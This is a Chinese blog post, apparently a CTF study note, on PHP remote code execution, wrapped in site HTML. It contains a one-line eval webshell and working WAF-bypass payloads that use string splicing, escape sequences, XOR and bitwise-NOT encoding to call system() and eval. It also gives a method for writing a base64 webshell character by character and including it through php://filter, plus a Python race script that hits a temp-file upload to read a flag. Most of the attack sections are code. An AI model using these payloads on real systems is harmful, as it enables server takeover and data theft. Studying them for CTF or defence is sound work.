@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言RCE英文全称：remote command&#x2F;code execute分为远程命令执行system和远程代码执行evel。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php代码执行">
+<meta property="og:url" content="https://mayylu.github.io/2022/07/15/php/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="mayylu">
+<meta property="og:description" content="前言RCE英文全称：remote command&#x2F;code execute分为远程命令执行system和远程代码执行evel。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715223832.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220802184221.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112652.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112630.jpg">
+<meta property="article:published_time" content="2022-07-15T13:04:19.000Z">
+<meta property="article:modified_time" content="2023-03-13T14:17:19.561Z">
+<meta property="article:author" content="mayylu">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715223832.png">
+
+
+<link rel="canonical" href="https://mayylu.github.io/2022/07/15/php/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2022/07/15/php/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","path":"2022/07/15/php/php代码执行/","title":"php代码执行"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>php代码执行 | mayylu</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mayylu</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E2%80%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">php–代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">php代码执行函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">2.2.</span> <span class="nav-text">php文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="nav-number">2.2.1.</span> <span class="nav-text">目录操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">2.2.2.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">2.2.3.</span> <span class="nav-text">文件写入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">2.2.4.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA"><span class="nav-number">2.2.5.</span> <span class="nav-text">输出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#waf%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">waf绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">长度绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8rce%E5%A5%97%E8%B7%AF"><span class="nav-number">2.5.</span> <span class="nav-text">经典rce套路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="nav-number">2.6.</span> <span class="nav-text">无参数rce</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="nav-number">2.6.1.</span> <span class="nav-text">核心代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E5%A4%96%E5%8F%96%E5%80%BC"><span class="nav-number">2.6.2.</span> <span class="nav-text">从外取值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-getallheaders"><span class="nav-number">2.6.2.1.</span> <span class="nav-text">1.getallheaders()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-get-defined-vars-%E7%89%88%E6%9C%AC%E8%A6%81%E6%B1%82%EF%BC%9APHP-4-gt-4-0-4-PHP-5-PHP-7"><span class="nav-number">2.6.2.2.</span> <span class="nav-text">2.get_defined_vars()(版本要求：PHP 4 &gt;&#x3D; 4.0.4, PHP 5, PHP 7)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-session-id"><span class="nav-number">2.6.2.3.</span> <span class="nav-text">3.session_id()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-getenv"><span class="nav-number">2.6.2.4.</span> <span class="nav-text">4.getenv()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.6.3.</span> <span class="nav-text">直接读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%93%8D%E4%BD%9C"><span class="nav-number">2.6.3.1.</span> <span class="nav-text">路径操作</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mayylu</p>
+  <div class="site-description" itemprop="description">关注生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2022/07/15/php/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mayylu">
+      <meta itemprop="description" content="关注生活的点点滴滴">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mayylu">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php代码执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-15 21:04:19" itemprop="dateCreated datePublished" datetime="2022-07-15T21:04:19+08:00">2022-07-15</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2023-03-13 22:17:19" itemprop="dateModified" datetime="2023-03-13T22:17:19+08:00">2023-03-13</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/php/" itemprop="url" rel="index"><span itemprop="name">php</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RCE英文全称：remote command/code execute<br>分为远程命令执行system和远程代码执行evel。</p>
+<span id="more"></span>
+<h2 id="php–代码执行"><a href="#php–代码执行" class="headerlink" title="php–代码执行"></a>php–代码执行</h2><h3 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h3><ul>
+<li><p>eval()<br>eval是一个语言构造器，并不是系统组件函数，不能被 可变函数 调用。因此我们在php.ini中使用disable_functions是无法禁止它的,只有使用插件才能禁用。因此一般我们的一句话木马一般都写成<code>&lt;?php eval($_POST[&#39;1&#39;]);</code>而不是<code>&lt;?php$_POST[&#39;1&#39;]($_POST[&#39;2&#39;]);</code><br>eval() 函数把字符串按照 PHP 代码来计算且只能执行一次,该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
+</li>
+<li><p>assert()<br>编写代码时，我们总是会做出一些假设，断言就是用于在代码中捕捉这些假设，可以将断言看作是异常处理的一种高级形式。程序员断言在程序中的某个特定点该的表达式值为真(为真才能继续执行)。如果该表达式为假，就中断操作. 版本在PHP7以下是函数 PHP7及以上为语法结构,<strong>php7.1</strong>以后就只能用eval了 assert默认没有执行功能了<br><code>assert ( mixed $assertion [, Throwable $exception ] )</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot; phpinfo()&quot;); &lt;错误&gt;</span><br><span class="line"></span><br><span class="line">eval(&quot; phpinfo();&quot;); &lt;正确&gt;</span><br><span class="line">assert(&quot; phpinfo()&quot;); &lt;正确&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>preg_replace() /e代码执行漏洞<br>preg_replace($pattern, $replacement, $subject),如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串.<br>(如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。)</p>
+</li>
+</ul>
+<p>正则表达式中的/e模式的作用是将<strong>替换串</strong>中的内容当作代码来执行，/e模式是php语言才有的，除此之外还有/i(不区分大小写)等。php5.5废除preg_replace的/e模式(不是移除)当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、  和 NULL) 而后进行后向引用替换.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)&#123; .......&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &#x27;test(&quot;\1&quot;)&#x27;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>在php中，<strong>双引号</strong>里面如果包含有变量，php解释器会将其替换为变量解释后的结果；<strong>单引号</strong>中的变量不会被处理。<br>我们如果提交<code>?h=[php]&#123;$&#123;phpinfo()&#125;&#125;[/php],replacement </code>参数变为<code>test(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)</code>,phpinfo()就会被执行</p>
+<h3 id="php文件操作"><a href="#php文件操作" class="headerlink" title="php文件操作"></a>php文件操作</h3><h4 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4><p>rmdir           删除目录<br>​is_dir()        函数检查指定的文件是否是目录。<br>getcwd()        同pwd<br>mkdir           创建目录<br>chdir           改变目录<br>scandir(“/“)    函数返回指定目录中的文件和目录的数组，$dir可以是相对路径，也可以是绝对路径</p>
+<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>move_uploaded_file  (临时上传文件路径,目标文件路径);//移动临时上传文件<br>unlink              删除文件<br>copy                复制文件copy($file, $newfile);<br>file_exists()       函数检查文件或目录是否存在。</p>
+<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p>file_put_contents   将一个字符串写入文件file_put_contents(“1.txt”,”6666”);参数 data 也可以是数组（但不能是多维数组）</p>
+<p>$fp = fopen(文件路径, “w”);//以写入模式打开一个文件 返回文件指针(不存在会自动创建)<br>fwrite($fp,写入字符串);//写入数据<br>fclose($fp);//关闭文件</p>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>file_get_contents           读入文件返回字符串，echo file_get_contents(“flag.txt”); echo file_get_contents(“<a target="_blank" rel="noopener" href="https://www.bilibili.com/&quot;">https://www.bilibili.com/&quot;</a>);<br>readfile                    读取一个文件，写入到输出缓冲区，并返回从文件中读入的字节数<br>file                        把整个文件读入一个数组中echo implode(‘’, file(‘<a target="_blank" rel="noopener" href="https://www.bilibili.com/&#39;">https://www.bilibili.com/&#39;</a>));<br>highlight_file/show_source  语法高亮一个文件highlight_file(“1.php”);<br>parse_ini_file              读取并解析一个ini配置文件print_r(parse_ini_file(‘1.ini’));<br>simplexml_load_file         读取文件作为XML文档解析</p>
+<p>​fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf打开文件或者 URL 读取文件流<br>$file = fopen(“test.txt”,”r”); echo fread($file,”1234”); fclose($file);</p>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>print_r() 函数用于打印变量，以更容易理解的形式展示。<br>var_dump() 函数用于输出变量的相关信息。<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715223832.png" alt="QQ截图20220715223832"></p>
+<h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><p>PHP7前是不允许用($a)()，即方法名不能被进一步解析<br>PHP7中增加了对此的支持</p>
+<ol>
+<li>字符串拼接绕过(<strong>PHP&gt;=7</strong>)<br>在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串”mochu7”，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>字符串转义绕过(<strong>php&gt;=7</strong>)<br>以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如”\400” == “\000”）<br>以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41”）<br>以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();#phpinfo();</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;);#system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>多次传参绕过</li>
+<li>异或绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/php/text.php?code=$&#123;(&#x27;%00&#x27;^&#x27;%5f&#x27;).(&#x27;%07&#x27;^&#x27;%40&#x27;).(&#x27;%05&#x27;^&#x27;%40&#x27;).(&#x27;%09&#x27;^&#x27;%5d&#x27;)&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//phpinfo()</span><br><span class="line"></span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure></li>
+<li>取反绕过(<strong>php&gt;=7</strong>)<br>PHP7前是不允许用($a)()，即方法名不能被进一步解析<br>PHP7中增加了对此的支持<br><code>(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96); #system(&#39;whoami&#39;);</code></li>
+</ol>
+<p><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</code><br><code>#assert（eval($_POST[test])) eval函数无法调用eval函数</code></p>
+<p>require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F<br>require+伪协议实现任意文件读取</p>
+<ol start="6">
+<li>利用php弱类型转化和自增<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//array(0) &#123;&#125;</span></span><br><span class="line"><span class="variable">$l</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];<span class="comment">//Array</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>).[])[<span class="number">3</span>]; <span class="comment">//NAN</span></span><br><span class="line">var_dump(<span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>]; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="comment">//$__=$_.$_++; 时的$_=O $_.$_++; 这个顺序是（实验得出来的）：</span></span><br><span class="line">	<span class="comment">// 先使用 后自增 最后使用 $__=$_.O; -&gt; $_++ -&gt; $__=P.O;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[].[];<span class="comment">//ArrayArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$%ff=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];<span class="comment">//A</span></span><br></pre></td></tr></table></figure>
+<h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3></li>
+<li>命令执行的利用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">param=`$_GET[1]`;&amp;1=bash</span><br><span class="line">param=exec($_GET[1]);</span><br></pre></td></tr></table></figure></li>
+<li>文件包含</li>
+</ol>
+<ul>
+<li>远程文件包含的利用</li>
+<li>本地文件包含的利用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">param=$_GET[a](N,a,8);&amp;a=file_put_contents</span><br><span class="line">//利用file_put_contents可以将字符一个个地写入一个文件中</span><br><span class="line"></span><br><span class="line"># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw</span><br><span class="line"># 最后包含</span><br><span class="line">param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="3">
+<li>利用变长参数特性展开数组<br>在PHP中可以使用 func(…$arr)这样的方式，将$arr数组展开成多个参数，传入func函数。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param=usort(...$_GET);</span><br></pre></td></tr></table></figure>
+<h3 id="经典rce套路"><a href="#经典rce套路" class="headerlink" title="经典rce套路"></a>经典rce套路</h3></li>
+<li>临时文件利用<br>get传参code= ?&gt;<?=`. /???/????????[@-[]`;?><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">s = requests.session()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://10.140.98.245/29-77/56.php&quot;</span></span><br><span class="line">    c = <span class="string">&quot;?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    payload = url+c</span><br><span class="line">    reques = s.post(url=payload, files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> reques.text.find(<span class="string">&quot;flag&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(reques.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
+<li>disable_fuctions绕过<br>查看目录</li>
+</ol>
+<p>print_r(scandir(dirname(‘<strong>FILE</strong>‘)));   //查看当前目录</p>
+<p>print_r(scandir(‘./‘));  //查看当前目录</p>
+<p>print_r(scandir(‘/‘));  //查看根目录</p>
+<h3 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h3><h4 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
